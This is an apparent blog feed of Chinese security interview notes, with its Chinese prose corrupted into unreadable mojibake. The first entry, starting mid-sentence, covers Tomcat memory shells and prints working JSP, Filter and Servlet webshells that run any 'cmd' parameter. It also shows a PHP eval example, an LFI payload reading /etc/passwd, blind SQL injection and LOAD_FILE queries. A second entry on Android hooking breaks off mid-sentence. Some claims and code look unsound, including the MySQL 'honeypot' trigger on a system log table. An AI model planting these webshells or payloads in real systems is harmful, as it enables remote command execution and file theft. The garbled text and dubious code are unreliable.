ä¸ºå†…å­˜é©¬ä¾èµ–äºè¿›ç¨‹çš„å†…å­˜ç©ºé—´ï¼Œè€Œé‡å¯ä¼šæ¸…é™¤å†…å­˜ä¸­çš„æ•°æ®ã€‚ä¸è¿‡ï¼ŒæŸäº›é«˜çº§çš„å†…å­˜é©¬å¯èƒ½ä¼šé€šè¿‡æŒä¹…åŒ–æœºåˆ¶ï¼ˆå¦‚å®šæ—¶ä»»åŠ¡ã€å¯åŠ¨é¡¹ç­‰ï¼‰åœ¨é‡å¯åé‡æ–°åŠ è½½ã€‚</p><h3 id="Tomcatå†…å­˜é©¬åˆ†ç±»"><a href="#Tomcatå†…å­˜é©¬åˆ†ç±»" class="headerlink" title="Tomcatå†…å­˜é©¬åˆ†ç±»"></a>Tomcatå†…å­˜é©¬åˆ†ç±»</h3><p>Tomcatå†…å­˜é©¬é€šå¸¸é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°ï¼š</p><ol><li><p><strong>JSPå†…å­˜é©¬</strong>ï¼šé€šè¿‡åŠ¨æ€ç”ŸæˆJSPä»£ç å¹¶åŠ è½½åˆ°Tomcatçš„å†…å­˜ä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSPMemoryHorse</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            response.getWriter().println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>Filterå†…å­˜é©¬</strong>ï¼šé€šè¿‡æ³¨å†Œè‡ªå®šä¹‰Filteræ‹¦æˆªè¯·æ±‚å¹¶æ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterMemoryHorse</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            p.waitFor();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                ((HttpServletResponse) response).getWriter().println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>Servletå†…å­˜é©¬</strong>ï¼šé€šè¿‡åŠ¨æ€æ³¨å†ŒServletæ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletMemoryHorse</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            response.getWriter().println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="åº¦å°æ»¡"><a href="#åº¦å°æ»¡" class="headerlink" title="åº¦å°æ»¡"></a>åº¦å°æ»¡</h2><h3 id="åŠ å¯†çš„æºç å¤„ç†"><a href="#åŠ å¯†çš„æºç å¤„ç†" class="headerlink" title="åŠ å¯†çš„æºç å¤„ç†"></a>åŠ å¯†çš„æºç å¤„ç†</h3><p>åŠ å¯†çš„æºç å¤„ç†é€šå¸¸æ¶‰åŠä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><ol><li><strong>åŠ å¯†ç®—æ³•é€‰æ‹©</strong>ï¼šé€‰æ‹©åˆé€‚çš„åŠ å¯†ç®—æ³•ï¼Œå¦‚AESã€RSAç­‰ã€‚</li><li><strong>å¯†é’¥ç®¡ç†</strong>ï¼šç¡®ä¿å¯†é’¥çš„å®‰å…¨å­˜å‚¨å’Œä¼ è¾“ã€‚</li><li><strong>åŠ å¯†å®ç°</strong>ï¼šä½¿ç”¨åŠ å¯†åº“å¯¹æºç è¿›è¡ŒåŠ å¯†ã€‚</li><li><strong>è§£å¯†å®ç°</strong>ï¼šåœ¨è¿è¡Œæ—¶è§£å¯†æºç ã€‚</li></ol><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨Pythonçš„AESåŠ å¯†ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_source_code</span>(<span class="params">source_code, key</span>):</span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    padded_code = source_code + (AES.block_size - <span class="built_in">len</span>(source_code) % AES.block_size) * <span class="built_in">chr</span>(AES.block_size - <span class="built_in">len</span>(source_code) % AES.block_size)</span><br><span class="line">    encrypted_code = cipher.encrypt(padded_code)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(iv + encrypted_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_source_code</span>(<span class="params">encrypted_code, key</span>):</span><br><span class="line">    encrypted_code = base64.b64decode(encrypted_code)</span><br><span class="line">    iv = encrypted_code[:<span class="number">16</span>]</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    decrypted_code = cipher.decrypt(encrypted_code[<span class="number">16</span>:])</span><br><span class="line">    <span class="keyword">return</span> decrypted_code[:-<span class="built_in">ord</span>(decrypted_code[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹ä½¿ç”¨</span></span><br><span class="line">source_code = <span class="string">&quot;print(&#x27;Hello, World!&#x27;)&quot;</span></span><br><span class="line">key = os.urandom(<span class="number">32</span>)</span><br><span class="line">encrypted = encrypt_source_code(source_code.encode(), key)</span><br><span class="line">decrypted = decrypt_source_code(encrypted, key)</span><br><span class="line"><span class="built_in">exec</span>(decrypted)</span><br></pre></td></tr></table></figure><h3 id="PHPçš„å±é™©å‡½æ•°"><a href="#PHPçš„å±é™©å‡½æ•°" class="headerlink" title="PHPçš„å±é™©å‡½æ•°"></a>PHPçš„å±é™©å‡½æ•°</h3><p>PHPä¸­çš„ä¸€äº›å±é™©å‡½æ•°åŒ…æ‹¬ï¼š</p><ul><li><code>eval()</code>ï¼šæ‰§è¡Œå­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç ã€‚</li><li><code>system()</code>ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li><li><code>exec()</code>ï¼šæ‰§è¡Œå¤–éƒ¨ç¨‹åºã€‚</li><li><code>passthru()</code>ï¼šæ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶å°†åŸå§‹è¾“å‡ºè¿”å›ã€‚</li><li><code>shell_exec()</code>ï¼šæ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶è¿”å›å®Œæ•´è¾“å‡ºã€‚</li><li><code>popen()</code>ï¼šæ‰“å¼€ç¨‹åºçš„ç®¡é“ã€‚</li><li><code>proc_open()</code>ï¼šæ‰§è¡Œå‘½ä»¤å¹¶æ‰“å¼€æ–‡ä»¶æŒ‡é’ˆã€‚</li></ul><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ª<code>eval()</code>çš„å±é™©ç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user_input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$user_input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰</h3><p>LFIï¼ˆLocal File Inclusionï¼‰æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡åŒ…å«æœ¬åœ°æ–‡ä»¶æ¥è¯»å–æˆ–æ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªLFIçš„åˆ©ç”¨ç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼åˆ©ç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/vulnerable.php?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure><h3 id="MySQLé™¤äº†SLEEPçš„å‡½æ•°"><a href="#MySQLé™¤äº†SLEEPçš„å‡½æ•°" class="headerlink" title="MySQLé™¤äº†SLEEPçš„å‡½æ•°"></a>MySQLé™¤äº†<code>SLEEP</code>çš„å‡½æ•°</h3><p>é™¤äº†<code>SLEEP</code>ï¼ŒMySQLä¸­è¿˜æœ‰å…¶ä»–å¯ä»¥ç”¨äºæ—¶é—´ç›²æ³¨çš„å‡½æ•°ï¼š</p><ul><li><code>BENCHMARK(count, expression)</code>ï¼šæ‰§è¡Œè¡¨è¾¾å¼å¤šæ¬¡ã€‚</li><li><code>UUID()</code>ï¼šç”Ÿæˆå”¯ä¸€æ ‡è¯†ç¬¦ã€‚</li><li><code>RAND()</code>ï¼šç”Ÿæˆéšæœºæ•°ã€‚</li></ul><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨<code>BENCHMARK</code>çš„ç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, BENCHMARK(<span class="number">1000000</span>, MD5(<span class="number">1</span>)), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="MySQLè¯»æ–‡ä»¶çš„æº¯æºï¼ˆMySQLèœœç½ï¼‰"><a href="#MySQLè¯»æ–‡ä»¶çš„æº¯æºï¼ˆMySQLèœœç½ï¼‰" class="headerlink" title="MySQLè¯»æ–‡ä»¶çš„æº¯æºï¼ˆMySQLèœœç½ï¼‰"></a>MySQLè¯»æ–‡ä»¶çš„æº¯æºï¼ˆMySQLèœœç½ï¼‰</h3><p>MySQLå¯ä»¥é€šè¿‡<code>LOAD_FILE</code>å‡½æ•°è¯»å–æ–‡ä»¶ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ä¸ºäº†æº¯æºï¼Œå¯ä»¥è®¾ç½®ä¸€ä¸ªMySQLèœœç½ï¼Œè®°å½•æ‰€æœ‰å¯¹æ•æ„Ÿæ–‡ä»¶çš„è®¿é—®ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> access_log (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    query TEXT,</span><br><span class="line">    ip <span class="type">VARCHAR</span>(<span class="number">45</span>),</span><br><span class="line">    <span class="type">timestamp</span> <span class="type">TIMESTAMP</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> before_query</span><br><span class="line">BEFORE <span class="keyword">INSERT</span> <span class="keyword">ON</span> mysql.general_log</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    IF NEW.argument <span class="keyword">LIKE</span> <span class="string">&#x27;%LOAD_FILE%&#x27;</span> <span class="keyword">THEN</span></span><br><span class="line">        <span class="keyword">INSERT</span> <span class="keyword">INTO</span> access_log (query, ip)</span><br><span class="line">        <span class="keyword">VALUES</span> (NEW.argument, CONNECTION_ID());</span><br><span class="line">    <span class="keyword">END</span> IF;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure><p>0x5A å¥‡å®‰ä¿¡-è§‚æ˜Ÿå®éªŒå®¤</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥ä½œã€‘é¢è¯•é¢˜æ•´ç† Androidå®‰å…¨ç›¸å…³</title>
      <link href="/2024/03/17/work/workandroid/"/>
      <url>/2024/03/17/work/workandroid/</url>
      
        <content type="html"><![CDATA[<h3 id="Frida-å’Œ-Xposed-åŸç†"><a href="#Frida-å’Œ-Xposed-åŸç†" class="headerlink" title="Frida å’Œ Xposed åŸç†"></a>Frida å’Œ Xposed åŸç†</h3><p><strong>Frida</strong>ï¼š<br>Frida æ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç æ’æ¡©å·¥å…·ï¼Œç”¨äºåœ¨è¿è¡Œæ—¶å¯¹åº”ç”¨ç¨‹åºè¿›è¡Œåˆ†æå’Œä¿®æ”¹ã€‚å…¶ä¸»è¦åŸç†æ˜¯é€šè¿‡æ³¨å…¥ä¸€ä¸ªä»£ç†ï¼ˆagentï¼‰åˆ°ç›®æ ‡è¿›ç¨‹ä¸­ï¼Œè¯¥ä»£ç†å¯ä»¥æ‰§è¡Œç”¨æˆ·å®šä¹‰çš„è„šæœ¬ï¼Œä»è€Œå®ç°å¯¹ç›®æ ‡è¿›ç¨‹çš„åŠ¨æ€åˆ†æå’Œä¿®æ”¹ã€‚Frida çš„æ³¨å…¥è¿‡ç¨‹åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li>æ‰¾åˆ°ç›®æ ‡è¿›ç¨‹å¹¶ä½¿ç”¨ <code>ptrace</code> è·Ÿè¸ªç›®æ ‡è¿›ç¨‹ã€‚</li><li>è·å– <code>mmap</code>ã€<code>dlopen</code>ã€<code>dlsym</code> ç­‰å‡½æ•°åº“çš„åç§»ã€‚</li><li>åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ç”³è¯·ä¸€æ®µå†…å­˜ç©ºé—´ï¼Œå°† Frida agent æ‹·è´åˆ°è¯¥å†…å­˜ç©ºé—´å¹¶æ‰§è¡Œã€‚</li></ol><p><strong>Xposed</strong>ï¼š<br>Xposed æ˜¯ä¸€ä¸ªæ¡†æ¶ï¼Œç”¨äºåœ¨ Android ç³»ç»Ÿä¸­åŠ¨æ€ä¿®æ”¹åº”ç”¨ç¨‹åºçš„è¡Œä¸ºã€‚å…¶åŸºæœ¬åŸç†æ˜¯é€šè¿‡ä¿®æ”¹ ART&#x2F;Dalvik è™šæ‹Ÿæœºï¼Œå°†éœ€è¦ hook çš„å‡½æ•°æ³¨å†Œä¸º Native å±‚å‡½æ•°ã€‚Xposed åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶åŠ è½½ <code>XposedBridge.jar</code>ï¼Œä»è€ŒåŠ«æŒ Zygote è¿›ç¨‹åŠå…¶åˆ›å»ºçš„ Dalvik è™šæ‹Ÿæœºã€‚Xposed çš„å·¥ä½œæµç¨‹åŒ…æ‹¬ï¼š</p><ol><li>æ›¿æ¢ <code>/system/bin/app_process</code> ç¨‹åºï¼Œæ§åˆ¶ Zygote è¿›ç¨‹ã€‚</li><li>åœ¨ Zygote è¿›ç¨‹å¯åŠ¨æ—¶åŠ è½½ <code>XposedBridge.jar</code>ã€‚</li><li>é€šè¿‡ JNI æ–¹æ³• <code>hookMethodNative</code> å°† Java å‡½æ•°å˜ä¸º Native å‡½æ•°ï¼Œä»è€Œå®ç° hookã€‚</li></ol><h3 id="Inline-Hookã€GOT-Hookã€Exception-Hook-åŸç†"><a href="#Inline-Hookã€GOT-Hookã€Exception-Hook-åŸç†" class="headerlink" title="Inline Hookã€GOT Hookã€Exception Hook åŸç†"></a>Inline Hookã€GOT Hookã€Exception Hook åŸç†</h3><p><strong>Inline Hook</strong>ï¼š<br>Inline Hook æ˜¯ä¸€ç§ç›´æ¥ä¿®æ”¹ç›®æ ‡å‡½æ•°å†…éƒ¨æŒ‡ä»¤çš„ hook æ–¹æ³•ã€‚é€šè¿‡åœ¨ç›®æ ‡å‡½æ•°çš„å¼€å¤´æ’å…¥è·³è½¬æŒ‡ä»¤ï¼Œå°†æ‰§è¡Œæµç¨‹è½¬å‘è‡ªå®šä¹‰çš„å‡½æ•°ã€‚è¿™ç§æ–¹æ³•å¯ä»¥ç›´æ¥åœ¨å‡½æ•°å†…éƒ¨è¿›è¡Œä¿®æ”¹ï¼Œé€‚ç”¨äºå¯¹ç‰¹å®šå‡½æ•°çš„ç²¾ç¡®æ§åˆ¶ã€‚<br><strong>GOT Hook</strong>ï¼š<br>GOTï¼ˆGlobal Offset Tableï¼‰Hook æ˜¯é€šè¿‡ä¿®æ”¹åŠ¨æ€é“¾æ¥åº“çš„å…¨å±€åç§»è¡¨æ¥å®ç°çš„ hook æ–¹æ³•ã€‚åœ¨åŠ¨æ€é“¾æ¥è¿‡ç¨‹ä¸­ï¼Œå‡½æ•°çš„åœ°å€ä¼šé€šè¿‡ GOT è¡¨è¿›è¡ŒæŸ¥æ‰¾ã€‚é€šè¿‡ä¿®æ”¹ GOT è¡¨ä¸­çš„åœ°å€ï¼Œå¯ä»¥å°†å¯¹ç›®æ ‡å‡½æ•°çš„è°ƒç”¨é‡å®šå‘åˆ°è‡ªå®šä¹‰çš„å‡½æ•°ã€‚<br><strong>Exception Hook</strong>ï¼š<br>Exception Hook æ˜¯é€šè¿‡æ•è·å’Œå¤„ç†å¼‚å¸¸æ¥å®ç°çš„ hook æ–¹æ³•ã€‚åœ¨ç›®æ ‡è¿›ç¨‹ä¸­è®¾ç½®å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå½“ç›®æ ‡å‡½æ•°è§¦å‘å¼‚å¸¸æ—¶ï¼Œå¼‚å¸¸å¤„ç†å‡½æ•°ä¼šæ‹¦æˆªå¹¶å¤„ç†è¯¥å¼‚å¸¸ï¼Œä»è€Œå®ç°å¯¹ç›®æ ‡å‡½æ•°çš„ hookã€‚</p><h3 id="DEX-ç»“æ„ã€ELF-ç»“æ„ã€åç¼–è¯‘è¿‡ç¨‹"><a href="#DEX-ç»“æ„ã€ELF-ç»“æ„ã€åç¼–è¯‘è¿‡ç¨‹" class="headerlink" title="DEX ç»“æ„ã€ELF ç»“æ„ã€åç¼–è¯‘è¿‡ç¨‹"></a>DEX ç»“æ„ã€ELF ç»“æ„ã€åç¼–è¯‘è¿‡ç¨‹</h3><p><strong>DEX ç»“æ„</strong>ï¼š<br>DEXï¼ˆDalvik Executableï¼‰æ˜¯ Android åº”ç”¨ç¨‹åºçš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ã€‚DEX æ–‡ä»¶åŒ…å«ç±»ã€æ–¹æ³•ã€å­—æ®µç­‰ä¿¡æ¯ï¼Œä»¥ Dalvik å­—èŠ‚ç å½¢å¼å­˜å‚¨ã€‚DEX æ–‡ä»¶çš„ç»“æ„åŒ…æ‹¬ï¼š</p><ul><li><strong>Header</strong>ï¼šåŒ…å«æ–‡ä»¶æ ‡è¯†ã€ç‰ˆæœ¬å·ç­‰ä¿¡æ¯ã€‚</li><li><strong>String Pool</strong>ï¼šå­—ç¬¦ä¸²å¸¸é‡æ± ã€‚</li><li><strong>Type Pool</strong>ï¼šç±»å‹æ± ã€‚</li><li><strong>Method Pool</strong>ï¼šæ–¹æ³•æ± ã€‚</li><li><strong>Class Pool</strong>ï¼šç±»æ± ã€‚</li></ul><p><strong>ELF ç»“æ„</strong>ï¼š<br>ELFï¼ˆExecutable and Linkable Formatï¼‰æ˜¯ Unix-like ç³»ç»Ÿä¸­å¯æ‰§è¡Œæ–‡ä»¶çš„æ ‡å‡†æ ¼å¼ã€‚ELF æ–‡ä»¶çš„ç»“æ„åŒ…æ‹¬ï¼š</p><ul><li><strong>ELF Header</strong>ï¼šåŒ…å«æ–‡ä»¶ç±»å‹ã€æ¶æ„ç­‰ä¿¡æ¯ã€‚</li><li><strong>Program Header Table</strong>ï¼šæè¿°å¦‚ä½•åŠ è½½ç¨‹åºåˆ°å†…å­˜ã€‚</li><li><strong>Section Header Table</strong>ï¼šæè¿°æ–‡ä»¶çš„å„ä¸ªéƒ¨åˆ†ã€‚</li></ul><p><strong>åç¼–è¯‘è¿‡ç¨‹</strong>ï¼š<br>åç¼–è¯‘æ˜¯æŒ‡å°†ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶è½¬æ¢å›æºä»£ç çš„è¿‡ç¨‹ã€‚å¯¹äº Android åº”ç”¨ç¨‹åºï¼Œå¸¸è§çš„åç¼–è¯‘æ­¥éª¤åŒ…æ‹¬ï¼š</p><ol><li>ä½¿ç”¨ <code>dex2jar</code> å°† DEX æ–‡ä»¶è½¬æ¢ä¸º JAR æ–‡ä»¶ã€‚</li><li>ä½¿ç”¨ <code>jd-gui</code> æˆ–å…¶ä»– Java åç¼–è¯‘å·¥å…·æŸ¥çœ‹ JAR æ–‡ä»¶ä¸­çš„æºä»£ç ã€‚</li></ol><h3 id="Java-åå°„ã€é™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†ã€ç±»åŠ è½½æœºåˆ¶ï¼ˆåŒäº²å§”æ´¾ï¼‰"><a href="#Java-åå°„ã€é™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†ã€ç±»åŠ è½½æœºåˆ¶ï¼ˆåŒäº²å§”æ´¾ï¼‰" class="headerlink" title="Java åå°„ã€é™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†ã€ç±»åŠ è½½æœºåˆ¶ï¼ˆåŒäº²å§”æ´¾ï¼‰"></a>Java åå°„ã€é™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†ã€ç±»åŠ è½½æœºåˆ¶ï¼ˆåŒäº²å§”æ´¾ï¼‰</h3><p><strong>Java åå°„</strong>ï¼š<br>Java åå°„å…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶è®¿é—®ã€æ£€æµ‹å’Œä¿®æ”¹ç±»ã€æ¥å£ã€å­—æ®µå’Œæ–¹æ³•çš„ä¿¡æ¯ã€‚é€šè¿‡åå°„ï¼Œå¯ä»¥åŠ¨æ€åœ°åˆ›å»ºå¯¹è±¡ã€è°ƒç”¨æ–¹æ³•å’Œè®¿é—®å­—æ®µã€‚<br><strong>é™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†</strong>ï¼š</p><ul><li><strong>é™æ€ä»£ç†</strong>ï¼šé€šè¿‡åœ¨ç¼–è¯‘æ—¶åˆ›å»ºä»£ç†ç±»æ¥å®ç°ä»£ç†åŠŸèƒ½ã€‚ä»£ç†ç±»å®ç°äº†ä¸ç›®æ ‡ç±»ç›¸åŒçš„æ¥å£ï¼Œå¹¶åœ¨è°ƒç”¨ç›®æ ‡æ–¹æ³•å‰åæ·»åŠ è‡ªå®šä¹‰é€»è¾‘ã€‚</li><li><strong>åŠ¨æ€ä»£ç†</strong>ï¼šé€šè¿‡åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆä»£ç†ç±»æ¥å®ç°ä»£ç†åŠŸèƒ½ã€‚Java æä¾›äº† <code>java.lang.reflect.Proxy</code> ç±»æ¥ç”ŸæˆåŠ¨æ€ä»£ç†ã€‚</li></ul><p><strong>ç±»åŠ è½½æœºåˆ¶ï¼ˆåŒäº²å§”æ´¾ï¼‰</strong>ï¼š<br>Java 